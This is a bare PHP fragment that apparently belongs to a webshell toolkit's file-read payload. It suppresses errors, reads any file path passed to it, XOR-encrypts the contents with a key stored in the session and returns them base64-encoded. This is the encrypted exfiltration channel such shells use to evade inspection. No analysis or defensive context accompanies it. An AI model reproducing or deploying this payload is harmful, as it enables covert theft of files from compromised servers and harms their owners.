error_reporting(0);
header('Content-Type: text/html; charset=UTF-8');


function main($path)
{
    $contents = file_get_contents($path);    
    session_start();
    $key=$_SESSION['k'];
    echo encrypt($contents, $key);
}


function encrypt($data,$key)
{
	for($i=0;$i<strlen($data);$i++) {
    	$data[$i] = $data[$i]^$key[$i+5&15]; 
    }
	return base64_encode($data);
}
